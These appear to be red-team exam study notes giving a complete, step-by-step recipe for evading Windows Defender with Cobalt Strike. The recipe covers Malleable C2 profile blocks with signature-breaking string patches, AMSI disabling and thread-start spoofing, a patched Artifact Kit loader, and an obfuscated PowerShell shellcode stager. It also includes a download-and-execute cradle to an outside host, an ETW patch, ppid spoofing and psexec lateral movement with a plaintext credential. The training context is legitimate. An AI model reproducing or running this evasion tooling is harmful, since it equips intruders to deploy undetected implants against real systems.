# Defence Evasion Lab — Malleable C2 & Artifact/Resource Kit

> **Exam relevance:** This is one of the highest-value prep topics. The OPSEC score (50 pts) is
> where most people fail. Defender must NOT block your payloads or fork&run post-ex commands.
> Every technique in this lab maps directly to an OPSEC scoring criterion.
>
> **Exam application order (do this before touching any target):**
> 1. SSH to team server → update Malleable C2 profile
> 2. Patch and build Artifact Kit → ThreatCheck clean
> 3. Build Resource Kit → fix templates → ThreatCheck AMSI clean
> 4. Load both `.cna` scripts into CS Script Manager
> 5. Test a beacon callback with Defender ON before engaging scope

---

## Why Defence Evasion Exists — The Detection Layers

Defender (and any EDR) operates at multiple scan layers. You must defeat each layer
independently — passing one does not mean passing all:

| Layer | When it runs | What it checks | Lab fix |
|-------|-------------|----------------|---------|
| **Static / disk scan** | When file is written to disk | PE headers, byte signatures, magic bytes | Artifact Kit (`magic_mz`, loop bytecode) |
| **AMSI (script)** | Before PS1/script executes | Script block content, string patterns | Resource Kit (string concat, Marshal.Copy, obfuscation) |
| **Memory scan** | After process starts, periodic | RWX pages, PE structures in memory, known byte sequences | `stage` block (userwx, copyheaders, module_x64, strrep) |
| **Behaviour / telemetry** | Runtime, continuous | Child process creation, thread start addresses, pipe names, parent-child chains | `post-ex` + `process-inject` blocks, ppid, spawnto |
| **Kernel callbacks** | Process creation | Command-line patterns, image names | ppid spoofing, alternative execution methods |

---

## Part 1 — Malleable C2 Profile

### Connect to team server

```bash
ssh attacker@10.0.0.5
# Password: Passw0rd!
cd /opt/cobaltstrike/profiles
nano default.profile
```

---

### Stage Block

```
stage {
    set userwx "false";
    set cleanup "true";
    set copy_pe_header "false";
    set module_x64 "Hydrogen.dll";

    transform-x64 {
        strrep "beacon.x64.dll" "bacon.x64.dll";
        strrep "%02d/%02d/%02d" "%02d/%02d/%04d";
        strrep "%s as %s\\\\%s: %d" "%s - %s\\\\%s: %d";
        strrep "%02d/%02d/%02d %02d:%02d:%02d" "%02d-%02d-%02d %02d:%02d:%02d";
        strrep "\\x48\\x89\\x5C\\x24\\x08\\x57\\x48\\x83\\xEC\\x20\\x48\\x8B\\x59\\x10\\x48\\x8B\\xF9\\x48\\x8B\\x49\\x08\\xFF\\x17\\x33\\xD2\\x41\\xB8\\x00\\x80\\x00\\x00" "\\x48\\x89\\x5C\\x24\\x08\\x57\\x48\\x83\\xEC\\x20\\x48\\x8B\\x59\\x10\\x48\\x8B\\xF9\\x48\\x8B\\x49\\x08\\xFF\\x17\\x33\\xD2\\x41\\xB8\\x01\\x80\\x00\\x00";
    }
}
```

**Why each setting:**

| Setting | Default | What it fixes | Defender alert prevented |
|---------|---------|--------------|--------------------------|
| `userwx "false"` | Single `PAGE_EXECUTE_READWRITE` (RWX) region | Allocates RW → copies beacon → sets per-section perms (`.text`=RX, `.data`=RW). RWX pages do not exist in legitimate code. | Memory scan alert with `sms` postfix in Defender logs |
| `cleanup "true"` | Loader stays in memory | Removes the beacon loader stub after the beacon DLL is mapped — reduces in-memory footprint | Reduces memory scan surface |
| `copy_pe_header "false"` | DOS + NT PE headers loaded in memory | PE headers are not needed at runtime. Their presence is a fingerprint — Defender's memory scanner identifies the in-memory PE. | In-memory PE fingerprint detection |
| `module_x64 "Hydrogen.dll"` | Beacon memory has no backing file on disk | **Module stomping:** CS loads `Hydrogen.dll` from `System32` into a new memory region, then overwrites it with Beacon shellcode. The memory region now appears backed by `Hydrogen.dll` — legitimate. Without this, tools like System Informer show a memory region with no backing module — an immediate anomaly. | Anomalous unbacked memory region detection |

**Why the `transform-x64 strrep` entries:**

The Beacon DLL contains literal strings that Defender has static signatures for. The `strrep` directive patches these bytes in the DLL before it is mapped into memory — the bytes on disk / in memory no longer match the known signature.

| Original string | Why signatured | Replacement |
|----------------|---------------|-------------|
| `beacon.x64.dll` | Trivially identifies the DLL as Cobalt Strike beacon by name | `bacon.x64.dll` — arbitrary rename |
| `%02d/%02d/%02d` (date format) | Defender recognises the specific date/time format strings used in beacon's internal logging | Modified to `%04d` year format — same function, different bytes |
| `%s as %s\\%s: %d` | Beacon impersonation log format — signatured by Defender | Delimiter changed to `-` |
| Raw hex bytes (`\x48\x89...`) | A specific byte sequence in beacon's internal code that Defender has a pattern for | Single byte flipped: `\xB8\x00` → `\xB8\x01` — breaks the signature without breaking functionality. The byte being changed is in a memory size constant — both values are valid in context. |

> **`strrep` constraint:** The replacement string must be ≤ the original string length. Beacon DLL sections are fixed size — you cannot add bytes, only replace or pad with nulls.

---

### Post-ex Block

```
post-ex {
    set spawnto_x64 "%windir%\\\\sysnative\\\\werfault.exe";
    set cleanup "true";
    set pipename "dotnet-diagnostic-#####, ########-####-####-####-############";
    set thread_hint "ntdll.dll!RtlUserThreadStart+0x2c";
    set amsi_disable "true";

    transform-x64 {
        strrep "This program cannot be run in DOS mode." "This is totally not a PE.";
        strrepex "PowerPick" "CLRCreateInstance failed w/hr 0x%08lx" "CLRCreateInstance failed: 0x%08lx";
        strrepex "PowerPick" "Failed to get default AppDomain w/hr 0x%08lx" "Failed to get default AppDomain: 0x%08lx";
        strrepex "ExecuteAssembly" "Invoke_3 on EntryPoint failed." "Unhandled exception.";
        strrepex "ExecuteAssembly" "Failed to load the assembly w/hr 0x%08lx" "Failed to load the assembly: 0x%08lx";
    }
}
```

**Context — what fork & run is:**
Commands like `execute-assembly`, `powerpick`, `mimikatz`, `portscan` use **fork & run** — CS
spawns a sacrificial child process (the `spawnto` target), injects a post-ex DLL into it, runs
the task, receives output via a named pipe, then kills the child. This entire chain is what the
`post-ex` block controls.

**Why each setting:**

| Setting | Default | What it fixes | OPSEC detection prevented |
|---------|---------|--------------|--------------------------|
| `spawnto_x64 "werfault.exe"` | `rundll32.exe` | `rundll32.exe` is heavily signatured as a CS spawnto default. Defender, SysMon, and EDRs have detection rules for CS beacons spawning `rundll32`. `werfault.exe` (Windows Error Reporting) is a legitimate system process that spawns frequently and makes sense as a child of many processes. | Suspicious process hierarchy / default CS indicator |
| `cleanup "true"` | Post-ex DLL stays in sacrificial process | Removes the injected shellcode from the sacrificial process memory once the task finishes — no leftover artifacts for a memory scanner to find | Memory scan of completed process |
| `pipename "dotnet-diagnostic-#####, ..."` | `msagent_*`, `postex_*`, `MSSE-*` patterns | **Critical for exam OPSEC score.** Default CS pipe names are on Defender's signature list. The `dotnet-diagnostic-` prefix blends with .NET runtime named pipes (CLR debugging/profiling) — legitimate on any Windows system with .NET. The `#####` and `####-####...` are wildcards CS replaces with random digits at runtime. | Default CS named pipe detection — **explicit OPSEC scoring criterion** |
| `thread_hint "ntdll.dll!RtlUserThreadStart+0x2c"` | Suspicious thread start address | Threads created by CS injection start at an address that points into the injected shellcode — anomalous. `thread_hint` spoofs the thread start address to look like it began from `ntdll!RtlUserThreadStart`, which is where all legitimate user-mode threads start. EDR thread start address checks pass. | Anomalous thread start address detection |
| `amsi_disable "true"` | AMSI active in sacrificial process | **For execute-assembly and powerpick to work, AMSI must be disabled in the sacrificial process.** AMSI in the fork&run process would scan the .NET assembly or PS script block before it runs. This setting patches AMSI in the sacrificial process memory before the post-ex DLL executes. Without this, Defender blocks execute-assembly and powerpick. | AMSI blocking execute-assembly / powerpick |

**Why the `strrepex` transform entries:**

The post-ex DLLs (PowerPick.x64.dll, ExecuteAssembly.x64.dll) contain error message strings that Defender signatures recognise as CS-specific. `strrepex` patches strings in a named specific module only (unlike `strrep` which applies to the main beacon DLL):

```
strrepex "<Module>" "<original>" "<replacement>";
# Module = "PowerPick" or "ExecuteAssembly"
```

| Module | Original string | Why flagged | Fix |
|--------|----------------|------------|-----|
| `PowerPick` | `CLRCreateInstance failed w/hr 0x%08lx` | Exact error string in CS PowerPick DLL — signatured | Changed `w/hr` → `:` — different bytes, same meaning |
| `PowerPick` | `Failed to get default AppDomain w/hr 0x%08lx` | Same pattern | Same fix |
| `ExecuteAssembly` | `Invoke_3 on EntryPoint failed.` | CS-specific error string | Replaced with generic `Unhandled exception.` |
| `ExecuteAssembly` | `Failed to load the assembly w/hr 0x%08lx` | Same pattern | `w/hr` → `:` |
| (main beacon DLL) | `This program cannot be run in DOS mode.` | Default DOS stub string present in beacon DLL in-memory | Replaced with arbitrary string — breaks PE header signature |

> **`strrepex` vs `strrep`:** `strrep` in `transform-x64` patches the main beacon DLL. `strrepex` in `post-ex.transform-x64` patches the specific named post-ex DLL. They are different targets — you need both.

---

### Process-Inject Block

```
process-inject {
    set allocator "VirtualAllocEx";
    set bof_allocator "VirtualAlloc";
    set bof_reuse_memory "true";
    set min_alloc "8192";
    set startrwx "false";
    set userwx "false";

    execute {
        CreateThread "ntdll.dll!RtlUserThreadStart+0x2c";
        NtQueueApcThread-s;
        NtQueueApcThread;
        SetThreadContext;
    }
}
```

**Context — what this controls:**
This block governs two things: (1) how BOF (Beacon Object File / `inline-execute`) memory is
managed in the beacon process itself, and (2) how shellcode is injected and executed when CS
injects into a remote process (fork&run, explicit injection).

**Why each setting:**

| Setting | Value | Why |
|---------|-------|-----|
| `allocator "VirtualAllocEx"` | Remote alloc via `VirtualAllocEx` Win32 API | Standard cross-process memory allocation for remote injection. With `userwx false`, memory starts RW, shellcode is copied, then marked RX — no RWX at any point. |
| `bof_allocator "VirtualAlloc"` | Local alloc for BOFs | BOFs run in the beacon thread — they allocate local (not remote) memory. No cross-process operations. |
| `bof_reuse_memory "true"` | Reuse previously allocated BOF slots | Reduces the number of `VirtualAlloc`/`VirtualFree` events visible to EDR hooks — reuses the same allocation across multiple BOF calls. |
| `min_alloc "8192"` | Minimum 8KB allocation | Prevents zero-size or tiny allocation anomalies. |
| `startrwx "false"` | Initial allocation is RW, not RWX | No RWX page is ever created — allocation starts RW, shellcode copied, then changed to RX. |
| `userwx "false"` | Final page is RX, not RWX | Same principle. Combined with `startrwx false` this guarantees no RWX at any stage. |

**Why the `execute` block methods:**

CS tries each execution method in listed order until one succeeds. The order matters for OPSEC:

| Method | How it works | OPSEC note |
|--------|-------------|-----------|
| `CreateThread "ntdll.dll!RtlUserThreadStart+0x2c"` | Creates thread with spoofed start address | Most compatible. Thread start address points to ntdll — looks legitimate. Listed first → used when possible. |
| `NtQueueApcThread-s` | Synchronous APC — queued to a thread in alertable wait state | No new thread created — executes in existing thread context. Harder for EDR to correlate. Works only if target thread is in alertable wait. |
| `NtQueueApcThread` | Standard APC | As above but standard (asynchronous). |
| `SetThreadContext` | Hijacks thread via context modification | Last resort — most disruptive to the target thread. Only used if all others fail. |

---

### Validate and restart the team server

```bash
# c2lint BEFORE restart — catch syntax errors without downtime:
/opt/cobaltstrike/c2lint /opt/cobaltstrike/profiles/default.profile

# If clean, restart:
sudo /usr/bin/docker restart cobaltstrike-cs-1

# Check logs for profile load errors:
sudo /usr/bin/docker logs cobaltstrike-cs-1
```

> If the docker log shows `[!]` errors, the profile has syntax errors — the team server will
> load without it. Fix and restart again. A team server running without a malleable profile uses
> CS defaults — all default indicators present.

---

## Part 2 — Artifact Kit

### Why the Artifact Kit exists

Every CS payload (`.exe`, `.dll`, `.ps1`) contains a **stub/loader** that decrypts and loads
the Beacon shellcode. This stub is compiled C code — the **artifact**. Defender has static
signatures for the exact bytecode patterns in CS's default artifact stubs, specifically the
decryption loop.

The Artifact Kit is CS's source code for these stubs. By modifying and recompiling the source,
you produce different bytecode — the logic is identical but the bytes on disk don't match the
known signature.

**You must do this before the exam. Defender will block default CS payloads immediately.**

---

### Step 1 — Patch `patch.c` in VSCode (Windows dev box)

```
Launch Visual Studio Code
File > Open Folder → C:\Tools\cobaltstrike\arsenal-kit\kits\artifact
Open: src-common\patch.c
```

**Line ~45 — the svc.exe payload decryption loop:**

The original loop is a standard forward `for` loop. Defender has a signature for its exact
compiled bytecode (the specific opcodes a forward for-loop on this data structure produces).

```c
// REPLACE WITH (backwards while loop — different compiled bytecode, identical logic):
x = length;
while ( x-- ) {
    * ( ( char * ) buffer + x) = * ( ( char * ) buffer + x ) ^ key [ x % 8 ];
}
```

**Line ~116 — the normal .exe payload decryption loop:**

Same concept — same signature target, same fix:

```c
// REPLACE WITH:
int x = length;
while ( x-- ) {
    * ( ( char * ) ptr + x ) = * ( ( char * ) buffer + x ) ^ key [ x % 8 ];
}
```

**Why this works:** Defender's static signature matches a specific sequence of x86/x64 opcodes
that the compiler produces from the original for-loop. The while-loop iterating backwards produces
different opcode sequences for the loop control logic (decrement + conditional jump vs increment +
compare + conditional jump). The XOR operation itself is identical — the decryption works exactly
the same — but the surrounding control flow bytecodes are different, so the pattern match fails.

> Comment out the old code rather than deleting — easy rollback if the build fails.

Save the changes (File > Save) then close the folder (File > Close Folder).

---

### Step 2 — Build in WSL (Ubuntu)

```bash
# Right-click Terminal taskbar icon → Ubuntu WSL
cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/artifact

# Build:
./build.sh mailslot VirtualAlloc 351363 0 false false none /mnt/c/Tools/cobaltstrike/custom-artifacts
```

**Why each build parameter:**

| # | Param | Value | Why |
|---|-------|-------|-----|
| 1 | `technique` | `mailslot` | How the stub passes shellcode internally — mailslot IPC is less signatured than the default `pipe` technique. `readfile` is OPSEC-CAUTION (writes to disk). |
| 2 | `allocator` | `VirtualAlloc` | Memory allocation method. `VirtualAlloc` is standard — combined with no-RWX profile settings it is acceptable. |
| 3 | `magic_mz_x86` | `351363` | Replaces the `MZ` magic bytes (0x4D5A) at PE offset 0 with custom bytes (351363 decimal = 0x055C03 → bytes `03 5C`). On disk/scan: `03 5C ...` doesn't look like a PE → passes static scan. At runtime the stub patches it back to `4D 5A` before executing. |
| 4 | `magic_mz_x64` | `0` | `0` = no substitution for x64 in this build. In exam you can use a non-zero value for both archs — the lab used 0 for x64. |
| 5 | `rdll_x86` | `false` | No reflective DLL staging for x86 (not needed here). |
| 6 | `rdll_x64` | `false` | Same for x64. |
| 7 | `stack_spoof` | `none` | No call stack spoofing in this build. |
| 8 | `output_dir` | `/mnt/c/Tools/cobaltstrike/custom-artifacts` | Where compiled artifacts land. |

---

### Step 3 — ThreatCheck after build

```cmd
ThreatCheck.exe -f "C:\tools\cobaltstrike\custom-artifacts\mailslot\artifact64big.exe"
```

- **No output** = clean. Proceed to load.
- **Output with hex offset** = Defender still has a signature for something in the artifact.

**If detected:** Use Ghidra to locate the flagged code at the offset ThreatCheck gives you,
find the corresponding source in `patch.c`, modify the implementation (different loop structure,
different variable operations), rebuild, and ThreatCheck again. Repeat until clean.

---

### Step 4 — Load into CS

```
Cobalt Strike > Script Manager > Load
→ C:\Tools\cobaltstrike\custom-artifacts\mailslot\artifact.cna
```

All future payloads generated in CS now use the custom artifact stubs.

---

## Part 3 — Resource Kit

### Why the Resource Kit exists

The Resource Kit controls the **PowerShell stager templates** — the `.ps1` scripts that CS
generates when you use Scripted Web Delivery or PowerShell-based stagers. When a target runs
`iex (new-object net.webclient).downloadstring(...)`, AMSI scans the script block before it
executes. Default CS PS1 templates have AMSI-detectable patterns.

By modifying the template source, you produce a PS1 that AMSI doesn't recognise.

---

### Step 1 — Build templates in WSL

```bash
cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/resource
./build.sh /mnt/c/Tools/cobaltstrike/custom-resources
```

This copies the template files to the output directory. No compilation — PS1 templates are not
compiled. You then edit them directly.

---

### Step 2 — Fix `template.x64.ps1` in VSCode

```
File > Open Folder → C:\Tools\cobaltstrike\custom-resources
Open: template.x64.ps1
```

**Line 5 — break the `System.dll` string:**

```powershell
# Before (AMSI-detected):
.Equals('System.dll')

# After (string concatenation — same runtime result, AMSI misses it):
.Equals('Sys'+'tem.dll')
```

**Why:** AMSI scans the literal script text for known strings. `'System.dll'` as a literal is
on its pattern list. String concatenation is evaluated at runtime — AMSI sees `'Sys'+'tem.dll'`
which doesn't match the pattern.

**Line 32 — replace `Marshal.Copy` with `WriteProcessMemory`:**

```powershell
$var_wpm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll WriteProcessMemory), (func_get_delegate_type @([IntPtr], [IntPtr], [Byte[]], [UInt32], [IntPtr]) ([Bool])))
$ok = $var_wpm.Invoke([IntPtr]::New(-1), $var_buffer, $v_code, $v_code.Count, [IntPtr]::Zero)
```

**Why:** The original code uses `[System.Runtime.InteropServices.Marshal]::Copy` to write
shellcode bytes into the allocated buffer. AMSI has a signature for this specific `Marshal.Copy`
usage pattern in the CS template context. The replacement achieves the same result using the
native Win32 `WriteProcessMemory` API directly via P/Invoke — different API call, no AMSI
signature match. `[IntPtr]::New(-1)` is `-1` = current process handle (pseudo-handle), so this
writes into the current process's own memory — identical effect to `Marshal.Copy` here.

Save the changes (File > Save).

---

### Step 3 — Replace `compress.ps1` with obfuscated version

Select `compress.ps1` in VSCode. Replace the entire content with the obfuscated version:

```powershell
SET-itEm  VarIABLe:WyizE ([tyPe]('conVE'+'Rt') ) ;  seT-variAbLe  0eXs  (  [tYpe]('iO.'+'COmp'+'Re'+'S'+'SiON.C'+'oM'+'P'+'ResSIonM'+'oDE')) ; ${s}=nEW-o`Bj`eCt IO.`MemO`Ry`St`REAM(, (VAriABle wYIze -val  )::"FR`omB`AsE64s`TriNG"("%%DATA%%"));i`EX (ne`w-`o`BJECT i`o.sTr`EAmRe`ADEr(NEw-`O`BJe`CT IO.CO`mPrESSi`oN.`gzI`pS`Tream(${s}, ( vAriable  0ExS).vALUE::"Dec`om`Press")))."RE`AdT`OEnd"();
```

**Why:** `compress.ps1` is the gzip decompress wrapper that CS wraps the beacon payload in.
The default version is a plain, readable PowerShell one-liner that AMSI has a pattern for.
This obfuscated version was generated via `Invoke-Obfuscation` (token-level obfuscation) and
produces identical runtime behaviour — `%%DATA%%` is the shellcode placeholder CS fills at
generation time.

> **Critical:** Never rename or obfuscate `%%DATA%%`. CS does a literal string substitution to
> inject the shellcode bytes. If `%%DATA%%` is missing, the payload generates with empty shellcode.

**Why this obfuscation passes AMSI:** Token-level obfuscation (mixed case, backtick splits,
variable aliasing) breaks the static string pattern matching AMSI uses without changing the
PowerShell AST (abstract syntax tree) — the code runs correctly but looks entirely different
to a regex/string match.

Save the changes (File > Save).

---

### Step 4 — ThreatCheck AMSI scan

```cmd
.\ThreatCheck.exe -f .\template.x64.ps1 -e AMSI -t Script
# Clean = "No threat found". If detected → fix the flagged line → re-scan.
```

---

### Step 5 — Load into CS

```
Cobalt Strike > Script Manager > Load
→ C:\Tools\cobaltstrike\custom-resources\resources.cna
```

All PowerShell stagers CS generates will now use the modified templates.

---

## Part 4 — Testing

### Generate a test beacon callback

```
CS GUI: Attacks > Scripted Web Delivery
Select: http listener → Launch → copy the URL
```

On target (Workstation — PowerShell):

```powershell
iex (new-object net.webclient).downloadstring("http://www.bleepincomputer.com/a")
```

Switch back to Attacker Desktop — a new beacon should check in.

> If Defender blocks the download: artifact or resource kit still has a signature. Run ThreatCheck
> on the artifact again. If Defender blocks the in-memory execution: stage block settings aren't
> applied or profile didn't reload correctly (check docker logs).

---

### Test lateral movement with custom service spawnto

Service payloads (`jump psexec64`) always default to `rundll32.exe` as the spawnto process.
The env var `%windir%` in `post-ex.spawnto_x64` does NOT resolve in SYSTEM context (used by
services). Override explicitly using Artifact Kit's `ak-settings` command:

```cs
// First impersonate a local admin on the target:
beacon> make_token CONTOSO\rsteel Passw0rd!

// Override spawnto for service payloads (explicit path, no env vars):
beacon> ak-settings spawnto_x64 C:\Windows\System32\svchost.exe

// Lateral move:
beacon> jump psexec64 lon-ws-1 smb
```

> `ak-settings` applies only to the Artifact Kit service payload spawnto — it does NOT affect
> the post-ex block `spawnto_x64`. These are separate controls for separate scenarios.

---

## Part 5 — Exam Day Application

### What you have built and why it matters for OPSEC scoring

| OPSEC scoring criterion (from Exam-Instructions.md) | What you built that addresses it |
|----------------------------------------------------|----------------------------------|
| Blocked by Defender / AppLocker | Custom Artifact Kit (backward while loop + magic_mz) + Resource Kit (string fixes + obfuscation) |
| Default CS indicators (pipe names, injection) | `post-ex.pipename` = `dotnet-diagnostic-*`, `post-ex.spawnto_x64` = `werfault.exe`, `process-inject` execute block |
| Outbound from unusual processes | `post-ex.spawnto_x64` controls which process handles fork&run (werfault.exe) |
| Suspicious lateral movement | This is separate — prefer `jump winrm64` over `jump psexec64` |

### Is this enough to pass Defender? — Yes, with conditions

The lab-proven values above are specifically tuned against Windows Defender in the Skillable
exam environment. They address every layer Defender uses against CS. **But:**

1. **Run ThreatCheck every time you rebuild.** If CS is updated between your lab and exam, new
   signatures may appear. The artifact/resource kit is not a one-time fix — verify clean each time.

2. **Don't skip `c2lint`.** A profile syntax error means the team server runs without malleable
   settings → all default CS indicators present → immediate OPSEC deductions.

3. **Run ETW patch after initial beacon check-in before any post-ex work.** The profile handles
   AMSI in fork&run processes but not ETW. ETW (Event Tracing for Windows) feeds EDR telemetry
   independently of AMSI. Patch it early:

   ```cs
   beacon> inline-execute etw_patch.o    // OPSEC-SAFE — BOF, runs in beacon thread
   ```

   Repeat after every lateral move to a new host.

4. **Set ppid and spawnto per-beacon context** — the profile sets a default, but after lateral
   movement you should set context-appropriate values:

   ```cs
   beacon> ps                                    // Find contextually appropriate parent PID
   beacon> ppid <explorer.exe PID>
   beacon> spawnto x64 %windir%\sysnative\werfault.exe
   ```

### Do you need additional bypass code beyond what is in this lab?

For the exam environment (Windows Defender on Skillable): **No**, if you follow the lab steps
exactly and ThreatCheck confirms clean. The lab config covers all Defender detection layers.

If you encounter a detection that the lab config doesn't address:
- Use ThreatCheck to identify the flagged bytes/pattern
- Use Ghidra to locate in the compiled artifact
- Modify the source-level code (not the bytes directly) → rebuild

---

## The Named Pipe Question — SMB Listener vs post-ex Pipename

Two completely separate settings are involved:

### 1. SMB Listener pipename (set when creating the listener)

From the Cobalt Strike Primer lab, the SMB listener was created with:
```
Pipename: TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
```

**This is the lab default value. DO NOT use this exact pipename on exam day.**

`TSVCPIPE-*` is a well-known CS default pattern. Defenders and detection rules flag it.
On exam day, create the SMB listener with a custom unique pipename that blends with legitimate
Windows pipe patterns. Examples of legitimate-looking patterns:

```
# Good — blends with Windows internal pipes:
wkssvc
srvsvc-<random>
netlogon-<random>
ntsvcs-<guid-format>

# Bad — CS defaults, all flagged:
TSVCPIPE-*
msagent_*
postex_*
MSSE-*-server
```

You will need to recreate the SMB listener in the exam environment. Don't copy the lab pipename.

### 2. `post-ex.pipename` in the Malleable C2 profile

```
set pipename "dotnet-diagnostic-#####, ########-####-####-####-############";
```

This controls the named pipe that fork&run (`execute-assembly`, `powerpick`, `mimikatz`, etc.)
uses to receive output from the sacrificial process back to the beacon. This is **not** the same
as the SMB listener pipe.

- The `#####` and `####-####...` patterns are wildcards — CS replaces them with random digits at runtime
- The `dotnet-diagnostic-` prefix blends with .NET CLR diagnostic pipes that exist on any Windows system with .NET installed
- The comma-separated second pattern is a fallback pipe name format

**Summary:**

| Pipe | Controlled by | Lab value | Exam day — use |
|------|--------------|-----------|----------------|
| SMB C2 comms pipe | Listener settings in CS GUI | `TSVCPIPE-4b2f70b3-...` | Custom unique name — NOT TSVCPIPE |
| Fork&run output pipe | `post-ex.pipename` in profile | `dotnet-diagnostic-#####...` | Use lab value — already OPSEC-safe |

---

## Complete Exam Day Sequence (Defence Evasion steps only)

```
1. SSH attacker@10.0.0.5 → cd /opt/cobaltstrike/profiles → nano default.profile
   → Add stage, post-ex, process-inject blocks (copy from cheatsheet)
   → /opt/cobaltstrike/c2lint /opt/cobaltstrike/profiles/default.profile
   → sudo /usr/bin/docker restart cobaltstrike-cs-1
   → sudo /usr/bin/docker logs cobaltstrike-cs-1   (confirm no [!] errors)

2. WSL (Ubuntu) on Windows dev box:
   → cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/artifact
   → Edit src-common/patch.c (lines ~45 and ~116 — backward while loops)
   → ./build.sh mailslot VirtualAlloc 351363 0 false false none /mnt/c/Tools/cobaltstrike/custom-artifacts
   → ThreatCheck.exe -f "C:\tools\...\artifact64big.exe"
   → If detected: fix patch.c → rebuild → ThreatCheck until clean

3. WSL (Ubuntu) on Windows dev box:
   → cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/resource
   → ./build.sh /mnt/c/Tools/cobaltstrike/custom-resources
   → VSCode: fix template.x64.ps1 (line 5 string concat + line 32 WriteProcessMemory)
   → VSCode: replace compress.ps1 content with obfuscated version
   → ThreatCheck.exe -f .\template.x64.ps1 -e AMSI -t Script   (until clean)

4. CS Script Manager → Load:
   → C:\Tools\cobaltstrike\custom-artifacts\mailslot\artifact.cna
   → C:\Tools\cobaltstrike\custom-resources\resources.cna

5. CS Listeners → Create SMB listener with CUSTOM pipename (not TSVCPIPE-*)

6. Test beacon: Attacks > Scripted Web Delivery → iex on workstation → confirm callback

7. After first beacon checks in:
   beacon> inline-execute etw_patch.o
   beacon> ps
   beacon> ppid <explorer.exe PID>
   beacon> spawnto x64 %windir%\sysnative\werfault.exe

8. Before any service payload (jump psexec64):
   beacon> ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
```

> **You have bypassed Windows Defender by modifying Cobalt Strike's default artifacts, resources,
> and post-exploitation behaviours. Every step above maps to an OPSEC scoring criterion.**
